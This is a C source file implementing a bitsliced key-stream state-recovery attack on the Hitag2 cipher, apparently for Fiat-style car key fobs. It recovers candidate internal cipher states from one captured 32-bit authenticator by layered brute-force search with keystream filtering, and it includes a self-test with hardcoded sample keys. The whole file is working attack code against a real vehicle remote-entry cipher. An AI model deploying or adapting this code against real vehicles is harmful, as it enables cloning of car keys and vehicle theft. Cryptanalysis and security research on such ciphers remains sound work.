#include "hitag2_hell.h"

#include <string.h>

typedef uint32_t bitslice_t;
#define BS_WIDTH 32U
#define BS_ALL_ONES  ((bitslice_t)0xFFFFFFFFU)
#define BS_ALL_ZEROS ((bitslice_t)0U)

#define f_a_bs(a, b, c, d) \
    ((bitslice_t) ~( (((a) | (b)) & (c)) ^ ((a) | (d)) ^ (b) ))
#define f_b_bs(a, b, c, d) \
    ((bitslice_t) ~( (((d) | (c)) & ((a) ^ (b))) ^ ((d) | (a) | (b)) ))
#define f_c_bs(a, b, c, d, e)                                                       \
    ((bitslice_t) ~( ((((((c) ^ (e)) | (d)) & (a)) ^ (b)) & ((c) ^ (b))) ^          \
                     ((((d) ^ (e)) | (a)) & (((d) ^ (b)) | (c))) ))

#define STATE_ARR_LEN 80U

#define LAYER0_MASK_FIATV1 ((uint64_t)0x368B452D601AULL)

static const uint8_t k_layer0_bits[20] = {
    1, 3, 4, 13, 14, 16, 18, 19, 21, 24, 26, 30, 32, 33, 35, 39, 41, 42, 44, 45,
};

static const uint8_t k_layer1_bits[14] = {
    0, 2, 12, 15, 17, 20, 23, 25, 29, 31, 34, 38, 40, 43,
};
static const uint8_t k_layer2_bits[5] = {11, 22, 28, 37, 48};
static const uint8_t k_layer3_bits[4] = {10, 27, 36, 49};
static const uint8_t k_layer4_bits[2] = {9, 50};
static const uint8_t k_layer5_bits[2] = {8, 51};
static const uint8_t k_layer6_bits[2] = {7, 52};
static const uint8_t k_layer7_bits[2] = {6, 53};
static const uint8_t k_layer8_bits[2] = {5, 54};

static inline bitslice_t bs_from_bit(uint8_t b) {
    return b ? BS_ALL_ONES : BS_ALL_ZEROS;
}

static inline uint8_t bs_get_lane(bitslice_t v, uint8_t lane) {
    return (uint8_t)((v >> lane) & 1U);
}

static inline uint8_t layer0_filter(uint64_t partial_state) {
    return hitag2_fiat_filter(partial_state);
}

static inline uint64_t expand_layer0(uint32_t idx) {
    uint64_t s = 0;
    for(uint8_t i = 0; i < 20U; i++) {
        if((idx >> i) & 1U) {
            s |= ((uint64_t)1 << k_layer0_bits[i]);
        }
    }
    return s;
}

static const bitslice_t k_spread_patterns[5] = {
    0xAAAAAAAAU, 0xCCCCCCCCU, 0xF0F0F0F0U, 0xFF00FF00U, 0xFFFF0000U,
};

static const uint8_t k_layer1_spread_sel[5] = {9, 10, 11, 12, 13};

static const uint8_t k_layer1_scalar_sel[9] = {0, 1, 2, 3, 4, 5, 6, 7, 8};

typedef struct {
    Hitag2HellResult* result;
    const bitslice_t* keystream;
    uint64_t states_tested;
    bool aborted;
} SearchCtx;

static uint64_t extract_state31(const bitslice_t state[STATE_ARR_LEN], uint8_t lane) {
    uint64_t s = 0;
    for(uint8_t i = 0; i < 48U; i++) {
        if(bs_get_lane(state[i], lane)) {
            s |= ((uint64_t)1 << i);
        }
    }
    return s;
}

static void emit_candidate(Hitag2HellResult* result, uint64_t state31) {
    for(uint32_t i = 0; i < result->candidate_count; i++) {
        if(result->candidates[i] == state31) return;
    }
    if(result->candidate_count >= HITAG2_HELL_MAX_CANDIDATES) {
        result->overflow = true;
        return;
    }
    result->candidates[result->candidate_count++] = state31;
}

static bitslice_t bs_filter_at(const bitslice_t state[STATE_ARR_LEN], uint8_t r) {

    static const int8_t group_pos[5][4] = {
        {41, 42, 44, 45},
        {32, 33, 35, 39},
        {21, 24, 26, 30},
        {14, 16, 18, 19},
        { 1,  3,  4, 13},
    };
    static const bool is_fa[5] = {true, false, false, false, true};

    bitslice_t g[5];
    for(uint8_t gi = 0; gi < 5U; gi++) {
        uint8_t idx[4];
        for(uint8_t k = 0; k < 4U; k++) {
            int8_t p = group_pos[gi][k];
            idx[k] = (uint8_t)((p >= r) ? (p - r) : (47 + r - p));
        }

        bitslice_t a = state[idx[3]];
        bitslice_t b = state[idx[2]];
        bitslice_t c = state[idx[1]];
        bitslice_t d = state[idx[0]];
        g[gi] = is_fa[gi] ? f_a_bs(a, b, c, d) : f_b_bs(a, b, c, d);
    }
    return f_c_bs(g[0], g[1], g[2], g[3], g[4]);
}

static bitslice_t bs_lfsr_at(const bitslice_t state[STATE_ARR_LEN], uint8_t r) {

    static const uint8_t taps[16] = {0, 1, 4, 5, 6, 17, 21, 24, 25, 31, 39, 40, 41, 44, 45, 47};
    bitslice_t v = 0;
    for(uint8_t i = 0; i < 16U; i++) {
        uint8_t p = taps[i];
        uint8_t idx = (uint8_t)((p >= r) ? (p - r) : (47 + r - p));
        v ^= state[idx];
    }
    return v;
}

static bool deep_search(
    SearchCtx* ctx, bitslice_t state[STATE_ARR_LEN], bitslice_t alive_mask) {

    for(uint32_t i2 = 0; i2 < (1U << 5); i2++) {
        for(uint8_t k = 0; k < 5U; k++) {
            state[k_layer2_bits[k]] = bs_from_bit((i2 >> k) & 1U);
        }
        bitslice_t f2 = bs_filter_at(state, 2);
        bitslice_t alive2 = alive_mask & ~(f2 ^ ctx->keystream[2]);
        if(alive2 == 0) continue;

        for(uint32_t i3 = 0; i3 < (1U << 4); i3++) {
            for(uint8_t k = 0; k < 4U; k++) {
                state[k_layer3_bits[k]] = bs_from_bit((i3 >> k) & 1U);
            }
            bitslice_t f3 = bs_filter_at(state, 3);
            bitslice_t alive3 = alive2 & ~(f3 ^ ctx->keystream[3]);
            if(alive3 == 0) continue;

            for(uint32_t i4 = 0; i4 < (1U << 2); i4++) {
                for(uint8_t k = 0; k < 2U; k++) {
                    state[k_layer4_bits[k]] = bs_from_bit((i4 >> k) & 1U);
                }
                bitslice_t f4 = bs_filter_at(state, 4);
                bitslice_t alive4 = alive3 & ~(f4 ^ ctx->keystream[4]);
                if(alive4 == 0) continue;

                for(uint32_t i5 = 0; i5 < (1U << 2); i5++) {
                    for(uint8_t k = 0; k < 2U; k++) {
                        state[k_layer5_bits[k]] = bs_from_bit((i5 >> k) & 1U);
                    }
                    bitslice_t f5 = bs_filter_at(state, 5);
                    bitslice_t alive5 = alive4 & ~(f5 ^ ctx->keystream[5]);
                    if(alive5 == 0) continue;

                    for(uint32_t i6 = 0; i6 < (1U << 2); i6++) {
                        for(uint8_t k = 0; k < 2U; k++) {
                            state[k_layer6_bits[k]] = bs_from_bit((i6 >> k) & 1U);
                        }
                        bitslice_t f6 = bs_filter_at(state, 6);
                        bitslice_t alive6 = alive5 & ~(f6 ^ ctx->keystream[6]);
                        if(alive6 == 0) continue;

                        for(uint32_t i7 = 0; i7 < (1U << 2); i7++) {
                            for(uint8_t k = 0; k < 2U; k++) {
                                state[k_layer7_bits[k]] = bs_from_bit((i7 >> k) & 1U);
                            }
                            bitslice_t f7 = bs_filter_at(state, 7);
                            bitslice_t alive7 = alive6 & ~(f7 ^ ctx->keystream[7]);
                            if(alive7 == 0) continue;

                            for(uint32_t i8 = 0; i8 < (1U << 2); i8++) {
                                for(uint8_t k = 0; k < 2U; k++) {
                                    state[k_layer8_bits[k]] = bs_from_bit((i8 >> k) & 1U);
                                }
                                bitslice_t f8 = bs_filter_at(state, 8);
                                bitslice_t alive8 = alive7 & ~(f8 ^ ctx->keystream[8]);
                                if(alive8 == 0) continue;

                                {
                                    bitslice_t v = state[0] ^ state[1] ^ state[4] ^ state[5] ^
                                                   state[6] ^ state[17] ^ state[21] ^ state[24] ^
                                                   state[25] ^ state[31] ^ state[39] ^ state[40] ^
                                                   state[41] ^ state[44] ^ state[45];
                                    state[47] = state[48] ^ v;
                                }

                                {
                                    bitslice_t v = state[0] ^ state[3] ^ state[4] ^ state[5] ^
                                                   state[16] ^ state[20] ^ state[23] ^ state[24] ^
                                                   state[30] ^ state[38] ^ state[39] ^ state[40] ^
                                                   state[43] ^ state[44] ^ state[48];
                                    state[46] = state[49] ^ v;
                                }

                                for(uint8_t r = 2; r < 7U; r++) {
                                    bitslice_t expected = bs_lfsr_at(state, r);
                                    alive8 &= ~(expected ^ state[48 + r]);
                                    if(alive8 == 0) break;
                                }
                                if(alive8 == 0) continue;

                                for(uint8_t r = 7; r < 32U; r++) {
                                    state[48 + r] = bs_lfsr_at(state, r);
                                }

                                for(uint8_t r = 9; r < 32U; r++) {
                                    bitslice_t fr = bs_filter_at(state, r);
                                    alive8 &= ~(fr ^ ctx->keystream[r]);
                                    if(alive8 == 0) break;
                                }
                                if(alive8 == 0) continue;

                                for(uint8_t lane = 0; lane < BS_WIDTH; lane++) {
                                    if(!((alive8 >> lane) & 1U)) continue;
                                    uint64_t state31 = extract_state31(state, lane);
                                    emit_candidate(ctx->result, state31);
                                    if(ctx->result->overflow) return true;
                                }
                            }
                            if(ctx->result->overflow) return true;
                        }
                    }
                }
            }
        }
    }
    return false;
}

bool hitag2_hell_recover(
    uint32_t authenticator,
    const Hitag2HellConfig* config,
    Hitag2HellResult* result) {
    if(!result) return false;
    memset(result, 0, sizeof(*result));

    bitslice_t keystream[32];
    for(uint8_t r = 0; r < 32U; r++) {
        uint8_t b = (uint8_t)((authenticator >> (31U - r)) & 1U);
        keystream[r] = bs_from_bit(b);
    }

    const uint32_t l0_full = 1U << 20;
    uint32_t l0_start = 0;
    uint32_t l0_end = l0_full;
    if(config) {
        if(config->l0_end > 0) {
            l0_start = config->l0_start;
            l0_end = config->l0_end;
            if(l0_end > l0_full) l0_end = l0_full;
        }
    }
    const uint32_t l0_total = l0_end - l0_start;

    const uint32_t progress_step = 32U;
    uint32_t next_progress = l0_start + progress_step;
    uint32_t t_start = 0;
    if(config && config->timeout_ms > 0 && config->now_ms_cb) {
        t_start = config->now_ms_cb();
    }

    SearchCtx ctx = {
        .result = result,
        .keystream = keystream,
        .states_tested = 0,
        .aborted = false,
    };

    for(uint32_t i0 = l0_start; i0 < l0_end; i0++) {
        uint64_t s0 = expand_layer0(i0);

        if(layer0_filter(s0) != ((authenticator >> 31) & 1U)) {
            ctx.states_tested++;
            continue;
        }

        bitslice_t state[STATE_ARR_LEN];
        memset(state, 0, sizeof(state));
        for(uint8_t k = 0; k < 20U; k++) {
            state[k_layer0_bits[k]] = bs_from_bit((uint8_t)((s0 >> k_layer0_bits[k]) & 1U));
        }

        for(uint8_t k = 0; k < 5U; k++) {
            uint8_t bit_pos = k_layer1_bits[k_layer1_spread_sel[k]];
            state[bit_pos] = k_spread_patterns[k];
        }

        for(uint32_t i1 = 0; i1 < (1U << 9); i1++) {
            if(config && config->cancel && *config->cancel) {
                result->cancelled = true;
                break;
            }
            for(uint8_t k = 0; k < 9U; k++) {
                uint8_t bit_pos = k_layer1_bits[k_layer1_scalar_sel[k]];
                state[bit_pos] = bs_from_bit((uint8_t)((i1 >> k) & 1U));
            }

            bitslice_t f1 = bs_filter_at(state, 1);
            bitslice_t alive = ~(f1 ^ keystream[1]);
            if(alive == 0) continue;

            deep_search(&ctx, state, alive);
            if(result->overflow) break;
        }

        ctx.states_tested += (1U << 9);

        if(result->cancelled) break;

        if(i0 >= next_progress) {
            next_progress += progress_step;
            uint8_t pct = (uint8_t)(l0_total ? ((uint64_t)(i0 - l0_start) * 100U / l0_total) : 100U);
            if(config && config->progress_cb) {
                if(!config->progress_cb(pct, ctx.states_tested, config->progress_ctx)) {
                    result->cancelled = true;
                    break;
                }
            }
            if(config && config->timeout_ms > 0 && config->now_ms_cb) {
                uint32_t now = config->now_ms_cb();
                if((now - t_start) >= config->timeout_ms) {
                    result->timed_out = true;
                    break;
                }
            }
        }
        if(result->overflow) break;
    }

    result->states_tested_total = ctx.states_tested;
    return result->candidate_count > 0;
}

static const uint8_t k_hell_self_test_keys[8][6] = {
    {0xB7U, 0x92U, 0x80U, 0xAEU, 0xCCU, 0x37U},
    {0xD4U, 0x24U, 0x28U, 0xF7U, 0xD9U, 0x66U},
    {0x4DU, 0x34U, 0x3FU, 0xD4U, 0xE7U, 0xB6U},
    {0x6DU, 0x6BU, 0xF2U, 0x1DU, 0x3AU, 0x1AU},
    {0xA3U, 0xF3U, 0xACU, 0xF7U, 0xB9U, 0x10U},
    {0x4DU, 0x49U, 0x4BU, 0x52U, 0x4FU, 0x4EU},
    {0xCDU, 0x49U, 0x4BU, 0x52U, 0x4FU, 0x4EU},
    {0x33U, 0xFAU, 0x2FU, 0xCDU, 0xC3U, 0x3BU},
};

static uint32_t compute_correct_l0(uint64_t state31) {
    uint32_t idx = 0;
    for(uint8_t i = 0; i < 20U; i++) {
        if((state31 >> k_layer0_bits[i]) & 1U) idx |= (1U << i);
    }
    return idx;
}

bool hitag2_hell_self_test(void) {

    uint32_t seed = 0xC0FFEE01U;
    for(uint8_t k = 0; k < 8U; k++) {
        const uint8_t* key = k_hell_self_test_keys[k];
        seed = seed * 1664525U + 1013904223U;
        uint32_t uid = seed;
        seed = seed * 1664525U + 1013904223U;
        uint8_t button = (uint8_t)(seed & 0xFU);
        uint16_t control = (uint16_t)((seed >> 4) & 0x3FFU);
        seed = seed * 1664525U + 1013904223U;
        uint32_t epoch = seed & 0x3FFFFU;

        uint32_t auth = hitag2_fiat_full_auth(uid, button, control, key, epoch);
        Hitag2State true_s31 = hitag2_fiat_init_phase(uid, button, control, key, epoch);
        uint32_t correct_l0 = compute_correct_l0(true_s31);

        Hitag2HellResult result;
        Hitag2HellConfig cfg = {0};
        cfg.l0_start = correct_l0;
        cfg.l0_end = correct_l0 + 1U;
        (void)hitag2_hell_recover(auth, &cfg, &result);

        bool matched = false;
        for(uint32_t i = 0; i < result.candidate_count; i++) {
            if(result.candidates[i] == true_s31) {
                matched = true;
                break;
            }
        }
        if(!matched) return false;
    }
    return true;
}
